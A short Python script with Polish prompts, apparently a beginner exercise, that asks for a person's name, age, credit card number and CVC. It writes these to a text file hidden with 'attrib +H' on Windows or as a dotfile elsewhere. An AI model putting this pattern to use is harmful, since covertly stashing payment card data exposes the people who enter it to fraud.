import platform
import subprocess

imie = input("Prosze podaj swoje imie przyjacielu \n")
nazwisko = input("Prosze podaj swoje nazwisko \n")
try:
    wiek = int( input("Ile masz lat? \n"))
except ValueError:
    wiek = 18
    print(wiek)
numerkarty = input("Dawaj swój numer karty kredytowej!!! \n")
kodCVC = input("I numer CVC!!! \n")

def ukryjPlik(nazwaPliku):
   with open(nazwaPliku, mode='a',encoding='UTF-8') as file:
        file.write(f"""
        {imie} {nazwisko}
        {wiek}
        {numerkarty}
        {kodCVC}
        """) 

if platform.system() == 'Windows':
    ukryjPlik('ukrytyPlik.txt')
    subprocess.check_call(["attrib","+H","ukrytyPlik.txt"])
elif platform.system() == "Darwin" or platform.system() == 'Linux':
    ukryjPlik('.ukrytyPlik.txt')